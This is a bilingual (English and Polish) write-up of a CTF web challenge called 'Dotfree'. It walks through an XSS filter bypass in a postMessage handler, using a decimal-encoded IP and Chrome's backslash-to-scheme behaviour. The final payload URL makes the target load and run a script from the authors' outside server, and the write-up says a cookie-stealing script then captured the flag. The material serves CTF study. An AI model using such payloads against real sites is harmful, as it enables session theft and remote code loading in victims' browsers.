# Dotfree (web, 19 solved, 208p)

```
All the IP addresses and domain names have dots, but can you hack without dot?

http://13.57.104.34/

```

In this simple challenge we can see a form with one field for URL, suggesting the XSS attack. A quick glance at the source code:
```javascript
    function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };

    function lce(doc, def, parent) {
    // ...
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    }
```

So appending the following JSON to the URL:
```
?{"iframe":{"value":"something"}}
```
will load and execute the script from the URL provided. We'd like to load the script from controlled server, but first we need to bypass some banned characters: dot (`.`), double slash (`//`) and unicode dot (`。`)

We can bypass the first one by putting our ip address in decimal form:
```
sasza.net -> 77.55.217.56 -> 1295505720
```
The next problem is to make browser load the script from remote server without using `http://` prefix. That one we can bypass using one of chrome features (as we believe that's the browser the bot is using) - putting double backslash as a URL prefix will be replaced with current schema - in this case `http://`. What's worth to mention, it works like this only on linux. In windows version of chrome `\\` is replaced with `file://`

Final payload:
```
http://13.57.104.34/?{"iframe":{"value":"\\\\1295505720"}}
```
will load and exec code hosted in our server. Now we just need to write a simple script to steal cookies and we get the flag:
```
rwctf{L00kI5TheFlo9}
```

The unicode dot on the list of blacklisted characters is something worth to mention. It's the protection against abusing another chrome's feature that's good to know - in URLs it's treated just like a plain ASCII dot, what has been used in simplexss challenge in 0CTF 2017 quals.
# PL

W tym prostym i przyjemnym zadanku dostajemy formularz przyjmujący od nas URL-a - co sugeruje konieczność znalezienia XSS-a. Szybki rzut oka na źródła:
```javascript
    function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };

    function lce(doc, def, parent) {
    // ...
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    }
```

Wynika z tego, że doklejenie JSON-a formatu:
```
?{"iframe":{"value":"something"}}
```
do adresu spowoduje załadowanie i wykonanie skryptu z podanego URL-a. Chcielibyśmy w tym momencie załadować skrypt z kontrolowanego przez nas serwera, jednak przeszkodą są tu filtry na niedozwolone znaki: kropkę (`.`), podwójny slash (`//`) i unicodową kropkę (`。`).

Filtr na kropkę ominiemy podając adres naszego serwera w postaci decymalnej:
```
sasza.net -> 77.55.217.56 -> 1295505720
```
Kolejnym problemem jest zmuszenie przeglądarki, żeby załadowała skrypt ze zdalnego serwera bez możliwości użycia prefiksu `http://`. Ten filter omijamy wykorzystując pewną własność przeglądarki chrome (którą, miejmy nadzieję, wykorzystuje bot) - podanie dwóch backslashy na początku URL-a zostanie podmienione na obecny scheme - w tym przypadku `http://`. Co ciekawe, dzieje się tak tylko pod linuksem - w windowsowej wersji `\\` zostanie zmienione na `file://`.

Ostateczny payload:
```
http://13.57.104.34/?{"iframe":{"value":"\\\\1295505720"}}
```
spowoduje załadowanie i wykonanie kodu hostowanego na naszym serwerze. Teraz wystarczy napisać prosty skrypt kradnący ciastka i dostajemy flagę:
```
rwctf{L00kI5TheFlo9}
```

Warto zwrócić uwagę na obecność unicode'owej kropki na liście zabronionych znaków. Jest to zabezpieczenie przed wykorzystaniem kolejnej cechy chrome'a, którą warto znać - w przypadku URL-i taki znak zostanie zinterpretowany jako zwykła kropka, co zostało wykorzystane w zadaniu simplexss z kwalifikacji 0CTF 2017.

